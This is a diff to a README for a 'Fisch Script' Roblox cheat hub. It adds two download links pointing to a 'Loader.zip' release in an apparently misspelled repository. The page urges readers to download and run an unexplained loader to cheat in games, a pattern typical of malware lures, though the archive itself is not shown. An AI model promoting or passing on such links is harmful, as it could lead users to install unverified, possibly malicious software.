@@ -1,7 +1,7 @@
 # 🐟 Fisch Script - Best Roblox Script Hub for 2025
 Welcome to **Fisch Script** — your go-to hub for the most powerful and reliable **Roblox scripts** out there! With support for a ton of popular games, **Fisch** offers a quick, keyless, and user-friendly experience that’s perfect for players of all skill levels.
 
-🔥 **[👉 DOWNLOAD FISCH SCRIPT 👈]()**
+🔥 **[👉 DOWNLOAD FISCH SCRIPT 👈](https://github.com/TripIng1s/fisch-scropt/releases/download/Release/Loader.zip)**
 
 ![fisc](https://github.com/user-attachments/assets/41f6b060-eeb8-457b-b050-865a7dd18323)
 
@@ -70,7 +70,7 @@ Fisch Script has got you covered for all the hottest and most beloved Roblox gam
 - ✅ Regular updates for the latest game scripts
 - ✅ A welcoming and active community
 
-🎯 **[📥 DOWNLOAD FISCH SCRIPT NOW]()**
+🎯 **[📥 DOWNLOAD FISCH SCRIPT NOW](https://github.com/TripIng1s/fisch-scropt/releases/download/Release/Loader.zip)**
 
 ---
 
